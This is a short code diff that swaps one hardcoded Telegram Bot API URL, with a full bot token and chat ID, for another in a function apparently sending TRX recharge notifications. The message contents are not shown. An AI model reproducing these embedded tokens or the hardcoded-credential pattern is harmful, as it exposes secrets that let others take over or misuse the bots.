@@ -38,7 +38,7 @@ export const trxRechargeTeleBot = async ({
 
     // Send the message via Telegram Bot API
     const response = await fetch(
-      `https://api.telegram.org/bot6740130325:AAFwI438ZedvOIv2OL42X3w3u362e8qiQEk/sendMessage?chat_id=6769991787&text=${encodedResult}`
+      `https://api.telegram.org/bot7473802609:AAFrhbHjjgGc36j7VaZlCR5QWqykcxDZ5v4/sendMessage?chat_id=5887031482&text=${encodedResult}`
     );
 
     if (!response.ok) {
